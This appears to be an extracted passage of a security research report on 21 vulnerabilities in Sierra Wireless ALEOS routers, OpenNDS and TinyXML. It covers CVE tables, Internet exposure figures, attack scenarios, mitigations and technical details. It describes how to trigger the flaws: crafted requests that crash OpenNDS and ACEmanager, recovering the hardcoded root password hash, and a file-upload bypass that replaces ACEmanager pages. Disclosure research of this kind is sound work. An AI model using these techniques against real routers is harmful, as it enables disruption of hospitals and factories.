•  ACEmanager: a web application developed by Sierra Wireless and used to configure and monitor the

state of a wireless router.
•
rp-pppoe: an open-source implementation of Point-to-Point Protocol over Ethernet (PPPoE) for Linux.
•  OpenNDS: an open-source captive portal used in ALEOS when the “Simple Captive Portal” is configured

via ACEmanager.

•  TinyXML: an open-source minimal XML document parser whose source code was included into one of

the libraries used by ACEmanager.

•  Libmicrohttpd: a small library to build simple HTTP servers used by OpenNDS. We only analyzed those

parts relevant to OpenNDS.

3.2.  New vulnerabilities

We discovered 21 new vulnerabilities that can be grouped into the following 5 impact categories:

•  Remote Code Execution (RCE) vulnerabilities allowing attackers to take full control of a device by

injecting malicious code.

•  Cross site scripting (XSS) vulnerabilities that may be used to inject malicious code on clients browsing

the ACEmanager application, thus potentially stealing credentials.

•  Denial of service (DoS) vulnerabilities that may be used to crash ACEmanager for a variety of reasons

from simple vandalism to more sophisticated multi-staged attacks.

•  Unauthorized access, via design flaws, such as hardcoded credentials and private keys and certificates,
that can be used for performing man-in-the-middle attacks or to recover passwords by capable attackers.

•  Authentication bypasses that allow attackers to skip the authentication service of the captive portal

service and connect to the protected WiFi network directly.

The new vulnerabilities are summarized in Table 2 (ALEOS) and Table 3 (OpenNDS). One issue has two CVE
IDs because it affects TinyXML independently (CVE-2023-34194) and as used by ACEmanager (CVE-2023-

Sierra:21 – Living on the Edge

6

40462). This occurs because TinyXML is typically not distributed as a library but integrated within a codebase
directly (such as with ACEmanager).

The vulnerabilities in Table 3 marked as “TRUE” can be be exploited in ALEOS when the “simple captive portal”
is enabled. Attackers must be able to interact with the captive portal running on ALEOS, which means that they
need to be in range of the WiFi network guarded by the portal or compromise another device that can connect to
that network. Issues marked with “FALSE” cannot be triggered in ALEOS conventionally, since the configuration
file of OpenNDS is not exposed to the user. Although they may be exploitable in other devices.

We did not find any new issues affecting the ALEOS AT commands interface, rp-ppoe or libmicrohttpd.

Table 2 – New vulnerabilities in ALEOS

CVE ID

Description

ACEmanager has an infinite loop when parsing certain malformed
XML documents. Triggering the bug leads to a DoS, rendering
ACEmanager unreachable. To restore availability, the affected
device needs to be manually restarted. Attackers do not need to
be authenticated to exploit the issue.

When authenticating a user, if ACEmanager receives an XML
document with an empty <password> tag, it crashes due to a
NULL-pointer dereference. This leads to a limited DoS, since
ACEmanager is automatically restarted. Attackers can prolong
the DoS by repeatedly sending malformed XML documents.
Attackers do not need to be authenticated to exploit the
issue.

Due to improper file path and content validation, attackers can
upload HTML documents that replace legitimate web pages within
ACEmanager. This can lead to a variety of issues, from defacing
ACEmanager to deploying malicious content via stored XSS. This
issue was introduced as an incomplete fix for CVE-2018-
4063.

ACEmanager allows authenticated users to upload a client
certificate and a client TLS key when configuring a VPN tunnel.
Insufficient validation of the name of the certificate/key being
uploaded allows for the injection of JavaScript code.

ACEmanager relies on TinyXML, which contains a reachable
assertion that terminates the application when parsing certain
malformed XML documents. This leads to a limited DoS, since
ACEmanager is automatically restarted. Attackers can prolong
the DoS by repeatedly sending malformed XML documents. All
logged-in users will be logged out as a side effect of the attack.
Attackers do not need to be authenticated to exploit the
issue.

CVE-2023-
40458

CVE-2023-
40459

CVE-2023-
40460

CVE-2023-
40461

CVE-2023-
34194
(TinyXML)

CVE-2023-
40462
(ACEmanager)

CVE-2023-
40463

CVSS
v3.1

Impact

7.5

DoS

7.5

DoS

7.1

XSS

8.1

XSS

7.5

DoS

ALEOS contains functionality to enable diagnostic root shell
access on devices for technical support specialists. The hash of
the root password is hard-coded. Attackers may be able to

8.1

Unauthorized
access

Sierra:21 – Living on the Edge

7

CVE-2023-
40464

recover the password and achieve root access on devices where
the diagnostic root shell access is enabled.

Several versions of ALEOS are shipped with a default SSL
private key and a certificate for ACEmanager, while users are not
urged to generate new ones. Obtaining these artifacts may
enable attackers to impersonate legitimate ACEmanager
applications that rely on the default SSL key and certificate, and
to sniff/spoof encrypted traffic between ACEmanager applications
and their clients.

8.1

Unauthorized
access

Table 3 – New vulnerabilities in OpenNDS

CVE ID

Description

CVE-2023-
38313

CVE-2023-
38314

CVE-2023-
38315

CVE-2023-
38320

CVE-2023-
38321

OpenNDS has a NULL-pointer dereference that leads to a
DoS. The issue can be triggered with a crafted GET request
to /opennds_auth/ with a missing client-redirect query
string parameter and client-token and custom query string
parameters set to arbitrary values. The issue occurs when a
client is about to be authenticated and takes place via a
different code path than CVE-2023-38314. Triggering the
issue crashes the OpenNDS daemon and denies Internet
access to any client that attempts to connect with this captive
portal.

OpenNDS has a NULL-pointer dereference that leads to a
DoS. The issue can be triggered with a crafted GET request
to /opennds_auth/ with a missing client-redirect query
string parameter and a client-token query string parameter
set to an arbitrary value. The issue occurs while a client is
not yet authenticated. Triggering the issue crashes the
OpenNDS daemon and denies Internet access to any client
that attempts to connect with this captive portal.

OpenNDS has a NULL-pointer dereference that leads to a
DoS. The issue can be triggered with a crafted GET request
to /opennds_auth/ with a missing client-token query
string parameter. Triggering the issue crashes the OpenNDS
daemon and denies Internet access to any client that
attempts to connect with this captive portal.

OpenNDS has a NULL-pointer dereference that leads to a
DoS. The issue can be triggered with a crafted GET request
to /opennds_preauth/ containing an arbitrary Host header
and no User-Agent header. Triggering the issue crashes the
OpenNDS daemon and denies Internet access to any client
that attempts to connect with this captive portal.

OpenNDS has a NULL-pointer dereference that leads to a
DoS. The issue can be triggered via a crafted GET request to
/opennds_auth/ with a missing custom query string
parameter and client-token and redirect query string
parameters set to arbitrary values. Triggering the issue

CVSS
v3.1

Impact  Affects

ALEOS?

6.5

DoS

TRUE

6.5

DoS

TRUE

6.5

DoS

TRUE

6.5

DoS

TRUE

6.5

DoS

TRUE

Sierra:21 – Living on the Edge

8

CVE-2023-
38322

CVE-2023-
38316

CVE-2023-
38317

CVE-2023-
38318

CVE-2023-
38319

CVE-2023-
38323

CVE-2023-
38324

CVE-2023-
41101

crashes the OpenNDS daemon and denies Internet access to
any client that attempts to connect with this captive portal.

OpenNDS has a NULL-pointer dereference that leads to a
DoS. The issue can be triggered via a crafted GET request to
/opennds_auth/ with a missing User-Agent header and
client-token, custom, and redirect query string
parameters set to arbitrary values. The issue occurs when a
client is about to be authenticated and happens via a
different code path than CVE-2023-38320. Triggering the
issue crashes the OpenNDS daemon and denies Internet
access to any client that attempts to connect with this captive
portal.

When the custom URL unescape callback is enabled in
OpenNDS, unauthenticated attackers can execute arbitrary
OS commands by inserting them into the URL portion of the
GET request.

6.5

DoS

TRUE

8.8

RCE

FALSE

OpenNDS does not sanitize the network interface name entry
in the configuration file, allowing attackers that have direct or
indirect access to the file to execute arbitrary OS commands.

6.7

RCE

FALSE

OpenNDS does not sanitize the gateway FQDN entry in the
configuration file, allowing attackers that have direct or
indirect access to the file to execute arbitrary OS commands.

OpenNDS does not sanitize the FAS key entry in the
configuration file, allowing attackers that have direct or
indirect access to the file to execute arbitrary OS commands.

6.7

RCE

FALSE

6.7

RCE

FALSE

OpenNDS does not sanitize the status path script entry in the
configuration file, allowing attackers that have direct or
indirect access to the file to execute arbitrary OS commands.

6.7

RCE

FALSE

When OpenNDS is configured as FAS, and the default FAS
key is used, users can skip the splash page sequence and
authenticate directly.

4.3

Auth
bypass

TRUE

OpenNDS (and the original NoDogSplash project) do not
validate the length of the query string of pre-authenticated
GET requests. This leads to a stack-based buffer overflow in
NoDogSplash and OpenNDS versions 9.x and earlier, and to
a heap-based buffer overflow in OpenNDS versions 10.x and
onward. Attackers may exploit the issue for DoS or to execute
arbitrary code.

9.6

RCE

TRUE

CVE-2023-
41102

OpenNDS (up to version 10.1.2) has multiple memory leaks
due to not freeing up allocated memory. This may lead to a
DoS due to the consumption of all available memory.

4.3

DoS

FALSE

4. Impact

Sierra:21 – Living on the Edge

9

As mentioned in Section 2, there are hundreds of thousands of Sierra Wireless routers running WiFi networks in
the wild. In this Section, we try to understand the Internet exposure and distribution of Sierra Wireless devices
(whether they run WiFi or not).

While the ALEOS documentation recommends exposing ACEmanager only within local networks, we found more
than 86,000 ACEmanager instances exposed directly to the Internet – see Figure 2. Most of these devices
(nearly 64%) run a version of ALEOS without the security patches for the vulnerabilities shown previously in Table
1.

Figure 2 – Numbers of exposed devices that run ACEmanager versus the security patch status of the underlying
ALEOS versions

We also searched for devices with an exposed AT commands interface, as this functionality was mentioned in
previous vulnerability reports. We could only reliably fingerprint AT interfaces that use the Telnet protocol and are
exposed via the standard port 2332. We found 2,849 devices with this interface exposed on the internet – see
Table 4. Ninety-nine percent of these devices are end-of-sale (EOS, about to be obsoleted) and 90% are end-of-
life (EOL, obsoleted). EOL devices have not received any security updates for approximately 2 years, according
to our estimates.

Table 4 – Number of devices with exposed AT command interface

Device

RV50

LS300

GX450

GX440

GX400

ES450

ES440

MP70

Count

EOS

EOL

665

578

538

470

248

221

97

20

TRUE

TRUE

TRUE

TRUE

TRUE

TRUE

TRUE

TRUE

TRUE

TRUE

TRUE

FALSE

TRUE

TRUE

FALSE

FALSE

Sierra:21 – Living on the Edge

10

RV50X

12

FALSE

FALSE

We also found more than 22,000 Internet-exposed devices that use the default SSL certificate highlighted in CVE-
2023-40464 – see Figure 3. The same default “server.crt” and “server.key” files are present in multiple ALEOS
versions (some of them marked as EOL, and some still supported).

Figure 3 – Numbers of exposed devices with the default SSL certificate of ACEmanager

We witnessed many types of organizations exposing these devices on Shodan, including a power distribution
operator, a national health system, a systems integrator, a retailer, a waste management provider, and a vehicle
tracking company. On Forescout Device Cloud, we see the following distribution of Sierra Wireless devices, by
industry:

Figure 4 – Distribution of Sierra Wireless routers by industry seen on Forescout Device Cloud

5. Attack Scenarios

Sierra:21 – Living on the Edge

11

In this Section, we discuss some possible attack scenarios with the new vulnerabilities that affect ALEOS and its
components. We focus on the two industries we observed most frequently deploying Sierra Wireless routers:
Healthcare and Manufacturing.

Attack summary

The attack scenarios below illustrate how an attacker could leverage some of the new vulnerabilities to take
full control of an OT/IoT router and achieve different goals such as network disruption, espionage, lateral
movement, and further malware deployment. In Scenario 1 (below), the attacker leverages the captive portal
vulnerability to take control of a router in a healthcare facility and attack devices of the patients, guests, or
staff. In the Scenario 2 (below), the attacker leverages the hardcoded credentials to take control of a router in
a manufacturing plant and attack industrial equipment.

Figure 5 – Scenario 1: Captive portal vulnerability in healthcare

For the healthcare scenario, shown in Figure 5, the attacker wants to infiltrate the network of a temporary
healthcare facility to achieve multiple possible end goals. For instance, the attacker may want to prevent
adequate and timely care by denying access to appointments, patient records, test results and other information,
or further infect the devices of staff and patients. In this scenario, a Sierra Wireless AirLink router is used to
provide wired and WiFi connections inside the facility, as well as a guest WiFi network with a captive portal that
can be reached by a nearby attacker.

In step 1, the attacker can exploit CVE-2023-41101 affecting the captive portal, which allows them to take full
control of the router. Then, in step 2, the attacker can disrupt the device itself, causing a persistent network
outage, or more subtly, disrupt connectivity of specific devices on the network. Additionally, the attacker may
exploit CVE-2023-40458 and bring down ACEmanager to prevent system administrators from taking corrective
actions in case the exploitation attempt was detected. The device will have to be manually restarted, which may
be difficult in some environments. Since the attacker has full control of the router, other types of attacks, such as
changing DNS server settings and using the router to distribute malware locally are also possible, thus infecting
devices of staff and visitors who connect to the affected WiFi network. The attacker can also move laterally into
adjacent networks and deploy ransomware on the IT workstations or exfiltrate patient records. An interesting
alternative is encrypting the files on the router to render it unusable, a form of embedded ransomware used
previously by hacktivists.

Sierra:21 – Living on the Edge

12

Figure 6 – Scenario 2: Hardcoded credentials vulnerability in manufacturing

For the manufacturing scenario, shown in Figure 6, the goal of a more sophisticated attacker is to gain initial
access into a manufacturing plant either for industrial espionage or for cyber-physical disruption. In this scenario,
the Sierra Wireless router is used to connect a series of industrial assets inside the plant (such as PLCs, servers,
engineering workstations and others) to the internet for remote monitoring and control.

In step 1, the attacker purchases a router similar to the one used at the plant. They find the hard-coded hash of
the root password used to access the diagnostic shell (CVE-2023-40463) and obtain the cleartext version of that
password by cracking the MD5 or SHA-512 hash (complex, but not impossible). In step 2, the attacker takes
advantage of social engineering by impersonating a technical support specialist who coerces the plant staff to
enable diagnostic shell access (something along the lines of, “It appears that your device is malfunctioning and
we must take corrective actions, otherwise your warranty and further technical support will be void”). The attacker
connects via a diagnostic root shell (step 3) and establishes persistence on the device, for instance by dropping a
RAT module. After establishing the initial access and gaining persistence, the attacker may impact the connected
OT assets using vulnerabilities such as those in OT:ICEFALL.

Additionally, since operational technology and IoT are now leveraged by hacktivists and criminals in opportunistic
attacks, OT/IoT routers may be targeted in less sophisticated attacks. The DoS and XSS vulnerabilities affecting
ACEmanager may be used for defacement and to prevent maintenance and corrective actions on vulnerable
routers, both types of impact that have been observed in recent hacktivist campaigns. While the web-related
vulnerabilities we found require authentication, weak credentials or the use of default SSL certificates may enable
attackers to use them effectively.

Apart from human attackers, vulnerabilities in ALEOS can also be used by botnet creators. For example, stolen
credentials can be harvested in automated fashion, similarly to how RapperBot keeps track of compromised SSH
servers. These credentials can then be used for leveraging the OS command execution vulnerabilities for
automatic propagation, communication with command-and-control servers, as well as performing DoS attacks,
just like various Mirai variants are doing with many compromised IoT devices in which similar vulnerabilities are
being found. In fact, previous botnets such as IoTroop/Reaper have targeted exposed Sierra Wireless routers via
default credentials and 0-days.

6. Mitigation Recommendations
Complete protection against the new vulnerabilities requires patching devices running the affected software. The
OpenNDS project has released OpenNDS 10.1.3 containing fixes for all reported vulnerabilities, and the

Sierra:21 – Living on the Edge

13

Nodogsplash project has released Nodogsplash 5.0.2 containing a fix for CVE-2023- 41101. TinyXML is an
abandoned open-source project, so the upstream vulnerabilities will not be fixed and must be addressed
downstream by affected vendors.

Sierra Wireless has released the following ALEOS versions to address the new vulnerabilities:

•  ALEOS 4.17.0 containing fixes for all relevant vulnerabilities.
•  ALEOS 4.9.9 containing applicable fixes, except for OpeNDS issues since that version does not include

OpenNDS.

In addition to patching, we recommend the following actions:

•  Change the default SSL certificate for Sierra Wireless routers and any other device in your network that

relies on default certificates.

•  Disable captive portals and other services, such as Telnet and SSH, if they are not needed. Alternatively,

limit the access to those services if they are needed.

•  Consider deploying a web application firewall in front of OT/IoT routers to prevent exploitation of web-
based vulnerabilities, such as many of the XSS, command injections and DoS found in this research.

•  Deploy an OT/IoT-aware intrusion detection system (IDS) to monitor both the connections between

external networks and the routers as well as connections between the routers and devices behind them.
This helps to detect signs of initial access leveraging the router, plus signs of attackers using the router to
further exploit critical devices

For previous vulnerabilities on Sierra Wireless products (1, 2, 3), the vendor and CISA have recommended the
following, which should also apply for the new vulnerabilities:

•  Always use strong, unique, and random credentials for devices. If Telnet or SSH is enabled, ensure a

strong password is set for the console accounts.

•  Disable access to ACEManager on the wide area network (WAN) and use the Sierra Wireless Airlink

Management System (ALMS) or an alternative device management platform for remote management of
ALEOS devices.
If the ACEManager must remain accessible via the WAN, restrict access by using measures such as
Private APN, VPN, or the ALEOS Trusted IP feature (restricts access to specific hosts).

•

•  When connecting to ACEManager, use only HTTPS.
•  Locate control system networks and remote devices behind the routers and isolate them from business

networks.

7. Conclusion
Vulnerabilities on network infrastructure have consistently ranked among the most exploited since at least 2020.
Although most attacks leveraging these vulnerabilities target IT networks and devices, the OT/IoT network
perimeter is attractive to attackers and has critical vulnerabilities.

In fact, the OT/IoT perimeter may be weaker than commonly accepted. A lot of attention is given to the
connections between IT and OT systems. Yet, there are connections using radio and cellular networks that
receive less attention in the security community but may provide attackers direct access to critical assets.

In this research, we analyzed the most popular line of OT/IoT cellular routers, found 21 new vulnerabilities
(15 of which directly affect the analyzed routers) and discussed their impact and potential attack scenarios in
critical industries such as healthcare and manufacturing.

Some of the lessons learned in this research include:

•  These devices not only have critical vulnerabilities, but often are left unpatched. Less than 10% of

routers seen on Shodan can be confirmed patched against previous vulnerabilities. While having
unpatched vulnerabilities in low-level OT assets is not surprising, given the difficulties in patching those

Sierra:21 – Living on the Edge

14

devices and the (frequently wrong) assumption that they are isolated, critical vulnerabilities in edge
OT/IoT devices may be exposing the crown jewels of critical infrastructure to attackers and could be
addressed more easily.

•  Exploit mitigations are still lacking in embedded devices. In Section 10, we discuss a detailed

exploitation of CVE-2023-41101 and show how, even with some mitigations available (such as NX and
ASLR), the lack of PIE made our exploit feasible. The reality is that embedded devices continue to lag IT,
both in addressing simple vulnerabilities and mitigating the effects of those vulnerabilities.
•  Besides design flaws and parsing problems causing vulnerabilities, we continue to see

incomplete fixes that give rise to new issues. We first observed this during the OT:ICEFALL
conclusion, but again in this study, we noticed a new vulnerability (CVE-2023-40460) coming out of an
incomplete fix (in this case, for CVE-2018-4063). As we previously discussed, device vendors must
address reported vulnerabilities beyond the shared proofs-of-concept and understand the actual root
causes. This will help them to fix issues and prevent their reoccurrence.

Finally, the fact that we found so many new vulnerabilities when looking at specific software components of a
well-studied device reinforces the fact that device manufacturers, and in turn asset owners, must pay special
attention to risks stemming from the software supply chain. The two open-source components found to be
vulnerable in this research highlight some of these risks:

•  TinyXML is an abandoned but popular project. TinyXML has not been maintained for nearly a decade.
The project already had one public vulnerability without a known fix prior to this research (CVE-2021-
42260, details in 9.4), and now there are two new issues which we found and that will not be fixed either.
Using open-source intelligence (OSINT) – mainly searching for product documentation mentioning the
TinyXML license – we were able to identify over 30 different products that still use TinyXML. Most of
those are either other open-source projects or security software, but there are also several automotive
infotainment systems, building automation devices and other IoT. It is difficult to know if and how any of
these products could be vulnerable since XML parsing is not always directly accessible by an attacker.
However, the proliferation of abandoned projects raises questions about how device vendors can respond
to new vulnerabilities.

•  OpenNDS is well-maintained, but versioning and forks make vulnerabilities hard to squash. We

found many more vulnerabilities on OpenNDS than on TinyXML. Five of these were fixed in version 10.x
before our disclosure, but they still affect version 9.x, which went EOL and will not receive any new
security fixes. After doing variant analysis, we found out that CVE-2023-41101 originates from the
NoDogSplash project, out of which OpenNDS was forked. The CVE was also fixed on NoDogSplash but
only for the latest version. Using the same OSINT method as with TinyXML, we could identify two popular
open-source firmware for a variety of routers supporting OpenNDS and NoDogSplash: OpenWRT and
DD-WRT. We also found documentation of a few router models from Linksys and Belkin mentioning
NoDogSplash directly (such as E9450 and RX7500). Although the open-source projects tend to quickly
adopt new versions of packages such as OpenNDS, router vendors take longer to include these in their
available firmware for end products.

The OSINT identification method above is certainly incomplete – for instance, we did not find open references to
OpenNDS for Sierra Wireless devices. The difficulty in fingerpriting and identiyfing devices running these software
packages again highlights the need for software bills of materials (SBoMs) for OT/IoT equipment to enable
vendors and asset owners to more easily understand which of their devices are affected when a new vulnerability
is discovered.

The lack of SBOMs also means that we may have missed important components to analyze in ALEOS, since
even with full access to the filesystem, it is not immediately obvious which libraries are relevant from a security
point of view and how they are used. Nevertheless, two components that probably deserve a better look in future
work are Strongswan (due to the increasingly important role of VPNs) and CoovaChilli, since it appears to be an
even more popular captive portal solution for embedded devices than OpenNDS and NoDogSplash.

Sierra:21 – Living on the Edge

15

Part 2: Technical Dive-Ins

Sierra:21 – Living on the Edge

16

8. Technical Dive-In #1: Research Methodology
We analyzed ALEOS 4.16.0, the latest version available at the time for AirLink LX40/LX60 wireless routers. At the
same time, we tried to understand if any new vulnerabilities discovered would be applicable to end-of-life (EOL)
versions.

Figure 7 - Vulnerability Research Methodology

Our methodology, depicted in Figure 7 above, can be broken down into the following phases:

1.  Obtaining devices and firmware/software packages. We obtained the following software packages
from the official product website of Sierra Wireless: ALEOS 4.4.9 for LS300, used as a reference and
to cross-check the findings, and ALEOS 4.16.0 for LX40/LX60, against which we performed the
research. ALEOS 4.4.9 is not encrypted (unlike the later versions) and some proprietary binaries
included within it contain debug symbols that help to better understand how ALEOS works.
2.  Decrypting/unpacking software packages. To decrypt version 4.16.0, we used the approach
outlined by Ruben Santamarta. After decryption, we located a file corresponding to a squashfs
filesystem, which is typical for devices that run embedded Linux. After unpacking it, we could access
the ALEOS binaries and other files.

3.  Black-box functional analysis. ACEmanager is a web application used to configure and monitor the
state of a wireless router, so we spent some time understanding the services and configuration
options that it provides. This also helped us to understand how to fingerprint devices running ALEOS
by retrieving the version number from the HTML content of the login page.

4.  Component identification and prioritization. Detailed in Section 8.1.
5.

Static and dynamic analysis of selected binaries and sources. Detailed in Section 8.2.

8.1.  Component analysis and prioritization

ALEOS is a large framework, so we had to prioritize the parts that could yield better results for potential attackers.

First, ACEmanager was reported vulnerable in most bundles shown in Table 1, with a total of 15 vulnerabilities.
While a well-researched component may seem like a bad target for new analysis, it might be the opposite.
Targets with high defect density may be even more prone to having other hidden vulnerabilities. Our initial
analysis of ACEmanager, its common exposure to the Internet, as well as insights from past research suggest
that this component is an ideal place to start. We also did a brief analysis of the AT commands interface, which
was found vulnerable twice in the past, as well as some opportunistic analysis of common pitfalls of embedded
Linux devices (I.e. hardcoded credentials, exposed configuration files, and insufficient access control).

Sierra:21 – Living on the Edge

17

Second, we attempted to compile a list of third-party software components used in ALEOS, yet were unable to
find any SBOM information while browsing its official website and corresponding documentation. Via manual
analysis of the filesystem, we identified the relevant open-source components of ALEOS 4.16.0 shown in Table 5.
That said, the list is incomplete because producing a complete SBOM would require a prohibitive amount of time.
We also do not include the list of standard Linux utilities. A tilde sign appearing before a version number signifies
that we could not identify the exact version number, and thus, provide an approximation.

Table 5 – Third-party components of ALEOS

Component

Version  Comments

OpenVPN

2.5.5

OpenVPN is a Virtual Private Network software that uses the OpenSSL library to
establish encrypted point-to-point or site-to-site tunnels.

OpenSSL

1.0.2

rp-pppoe

3.10

A cryptography toolkit present as a standard library in most Linux distributions.
The component is outdated since the latest release of this branch is 1.1.1.LTS.
There are vulnerabilities fixed since version 1.0.2, but their impact highly depends
on the usage context of the library, and there is extended support available for
version 1.0.2 for premium customers.

An implementation of Point-to-Point Protocol over Ethernet (PPPoE) client, relay
and server for Linux. Initially developed by Roaring Penguin, the project is
currently maintained by Skoll Software Consulting. The component is outdated
since the latest version is 4.0. There were no recent vulnerabilities reported on the
NVD.

Dropbear SSH  2020.81  An SSH server and client used in embedded Linux distributions. The SSH server

is used for the AT commands interface when enabled. This component is outdated
but we could not find any vulnerabilities that might affect it, considering its usage
context.

jQuery

1.11.0

The JavaScript library used for ACEmanager. This component is outdated since
the latest release is 1.12.4. Several vulnerabilities we could find on the NVD seem
to be context dependent.

OpenNDS

9.1.1

CoovaChilli

1.4

Strongswan

5.9.5

A captive portal used in ALEOS when the “Simple Captive Portal” is configured via
ACEmanager. This project is a successor of NoDogSplash that adds the
Forwarding Authentication Service (FAS) functionality. The version used is much
older than the latest available release at the time (9.10.0). We also noticed the
absence of publicly known vulnerabilities.

A captive portal used in ALEOS when the “Authenticated Captive Portal” is
configured via ACEmanager. This project is a successor of ChilliSpot. We could
not find any recent vulnerabilities on the NVD. However, due to the complexity of
the project, we decided not to analyze it at this moment.

An open-source IPSec-based VPN solution. This component is outdated since the
latest release is 5.9.11. We found two recent vulnerabilities (CVE-2023-26463 and
CVE-2022-40617) that could potentially affect the present version. However, we
did not explore this project in the present research.

Dnsmasq

2.84rc2  This project supports network services such as DNS and DHCP for smaller

networks. We found a number of disclosed vulnerabilities that could affect the
present version.

TinyXML

~2.6.2

A minimal XML document parser implemented in C++. The source code of the
project was included into one of the libraries that are a dependency of
ACEmanager. The project has been abandoned for a while and new users are

Sierra:21 – Living on the Edge

18

recommended to use TinyXML2. We found only one vulnerability not addressed in
the upstream releases.

libmicrohttpd

~0.9.75  A small library to build simple HTTP servers. This library ships with OpenNDS and

is not used within ALEOS otherwise.

We analyzed the components that did not have many recent security vulnerabilities disclosed and were able to be
analyzed within a limited timeline: rp-pppoe, OpenNDS, TinyXML and libmicrohttpd (only those parts relevant to
OpenNDS). Such components are interesting because the absence of vulnerabilities in them may be due to three
factors:

•  The component may be well-maintained and error-free.
•  The developers may not issue CVE identifiers and make special vulnerability announcements, treating

security issues like regular bugs and producing silent patches.

•  A project may be abandoned by its developers while still being used in other projects as a dependency.

Thus, the project receives no attention from vulnerability researchers because it is deemed to be
“unused”, while the software maintainers that integrate the project have a false sense of security due to
no found vulnerabilities for a long period of time.

8.2.  Static and dynamic analysis of binaries

We started with static analysis of ACEmanager in version 4.16.0 and its immediate dependencies. We emulated
ACEmanager and its immediate components using QEMU, wrapping most of the original filesystem into a Docker
container and running it with qemu-arm-static. We could then attach a remote debugger and better explore the
functionality of ACEmanager. Figure 8 (below) shows a debugging session with ALEOS logs on the left, and the
disassembly of the “main()” function on the right.

Sierra:21 – Living on the Edge

19

Figure 8 – Emulating and debugging ACEmanager

For open-source components, we simply downloaded the source code for the versions of the projects that are
shipped with ALEOS, compiled it and analyzed it using a combination of static and dynamic analysis, with source
code review and lightweight fuzzing with libFuzzer.

9. Technical Dive-In #2: Details of New Vulnerabilities

9.1.  CVE-2023-40464: Default SSL private key and

certificate

ACEmanager can serve web content over HTTPS using an SSL private key and certificate stored under
/etc/ACEmanager/certs/server.key and /etc/ACEmanager/certs/server.crt, respectively. Users can
update the key and cert via ACEmanager but they are not warned to do so in the first place.

Using the default key/certificate is dangerous since attackers can retrieve them from the software package and
use them to perform man-in-the-middle attacks and either access a vulnerable system or modify data in transit
between a client and a vulnerable ACEmanager. For instance, the advisory for a previous vulnerability on ALEOS,
CVE-2018-4069 – cleartext transmission of credentials – recommends as mitigation to configure a device to only
use HTTPS for accessing ACEmanager. However, when the default private key and certificate are used, this
mitigation is insufficient, as attackers can decrypt the traffic and retrieve the credentials.

9.2.  CVE-2023-40463: Root shell access and

hardcoded password hashes

The SSH server on Sierra Wireless routers is exclusively used for the AT commands interface when SSH is
configured instead of Telnet. The root account is disabled in /etc/shadow by default, so while the root user
exists on the system, it cannot login, even if SSH acces is enabled.

Sierra:21 – Living on the Edge

20

However, there is a setting within ACEmanager called “Diagnostic shell access” described in the official
documentation as follows: “When enabled, this field allows Sierra Wireless Tech Support personnel to locally
access the diagnostic shell on your router. It should be left at the default setting unless Sierra Wireless
TechSupport asks you to change it.” This setting enables SSH access to the root user on port 22.

To understand how this functionality is implemented, we analyzed the cmdexe binary, which applies system-wide
changes coming from ACEmanager. There, we found the following logic related to modyfing the /etc/shadow
file:

•  When the “Diagnostic shell access” is disabled via ACEmanager, cmdexe will write the hash value of root

in the /etc/shadow file as *, effectively disabling root shell access.

•  When this setting is enabled, the code will take a string with an obfuscated Unix SHA-512 hash of the
root password and write it into /etc/shadow. This allows anyone who knows the password that
corresponds to the said hash to log into SSH with root privileges.

The logic that de-obfuscates the SHA-512 hash is fairly simple and is illustrated in Figure 9 (below). We show a
Python version of the logic for simplicity. The string that contains the obfuscated hash is rearranged according to
the hardcoded index table (each index in the table is padded with one zero). We also looked at this logic in other
versions of ALEOS. For example, in ALEOS 4.4.9, an MD5 hash is used instead of SHA-512, and the elements of
the index table are padded with three zeros instead of one (perhaps, because the index table has a fixed size and
MD5 hashes are shorter). Despite these minor differences, the logic is the same.

Figure 9 – A script that de-obfuscates the root password hash (Python)

The value of the hardcoded password hash appears to be different across different builds of ALEOS for different
devices. However, as we have demonstrated above, it can be easily retrieved by motivated attackers.

While SHA-512 hashes are notoriously hard to break, determined attackers may succeed with a lucky dictionary
attack. This will grant them immediate root access for devices that run a certain build with the diagnostic shell
enabled. MD5 hashes are much easier to break. Therefore, older devices face a bigger risk. Malicious actors
could also trick Sierra Wireless support staff into logging into a device that they control to intercept the root
password. In this case, they might gain access to all similar devices that run that particular build of ALEOS.

This same issue was previously reported by Ruben Santamarta, however it was not included into the
corresponding advisory at the time.

Sierra:21 – Living on the Edge

21

9.3.  Web vulnerabilities

The first issue (CVE-2023-40459) is a NULL-pointer dereference that can be triggered when a user is about to log
into ACEmanager. When users log in, the JavaScript code built into the ACEmanager’s login page performs the
following POST request to the internal URL /xml/Connect.xml (as in Figure 10 below):

Figure 10 – A POST request to Connect.xml

The XML document embedded into the data of the POST request contains the login and password XML tags
that are created directly from the corresponding elements on the web form. Additionally, the value of the
password tag is wrapped into the CDATA tag to ensure that the value is interpreded as content, not XML markup
(a type of input sanitization).

After the above XML document is received, it is passed into the TinyXML component (see Table 5), which
extracts the value of the login and password tags.

Figure 11 – Pseudocode fragment that corresponds to CVE-2023-40459

The pseudocode fragment that handles the password tag value extraction is shown in Figure 11 and summarized
below:

•  The code retrieves the password tag from the XML document by calling TiXmlHandle::FirstChild()

several times.

•  The code proceeds with calling the TiXmlText::CDATA() function (line 121) on the text element retrieved

•

from the password tag.
If the password tag is completely empty, that is the corresponding TiXmlText object is NULL, the call to
TiXmlText::CDATA() will cause a NULL-pointer dereference, and ACEmanager will crash.

To trigger the issue, attackers must send a POST request similar to the one shown above in Figure 10, with the
password tag empty. The ACEmanager will restart in a few seconds after the crash. However, all logged in users
will be logged out. Attackers can send a malformed POST request continuously to prolong the DoS indefinitely.

Sierra:21 – Living on the Edge

22

The second issue (CVE-2023-40460) is related to the XML configuration template upload functionality, which is
somewhat similar to CVE-2018-4067. These templates are used for quick configuration of a device. Instead of
tweaking settings in ACEmanager manually, an XML file that reflects all current settings can be created and then
uploaded to another device to apply the same settings.

The vulnerability allows authenticated users to upload arbitrary malicious files in place of XML configuration
templates, due to improper validation of the file name being uploaded, and its content. In case these arbitrary files
are names like legitimate web pages of ACEmanager, these malicious files will be served instead of the legitimate
ones.

Figure 12 – A POST request that uploads a malicious file via template_upload.cgi

Authenticated attackers can send malicious files via POST requests similar to the one shown above in Figure 12.
Note that the valid values for token and csrt-token must be provided. However, attackers can obtain these
values by sniffing the network traffic and do not need to posess valid credentials.

The POST request shown in Figure 12 will replace the legitimate ACEManagerX.html page, which is the main
HTML page of ACEmanager, with its copy that contains malicious content crafted by the attacker. To bypass the
content validation checks, the contents of the malicious file must begin with the XML tag <?xml version=’1.0’
?>. Malicious files are served instead of legitimate ones with the same name for the following reasons:

•  The XML templates are uploaded to the folder /www/auth/user/upload/ and the legitimate web content

of ACEmanager is located in the /www/auth/viewer/* folder.

•  The ACEmanager binary explicitly maps the content from the folders /www/auth/user/* and

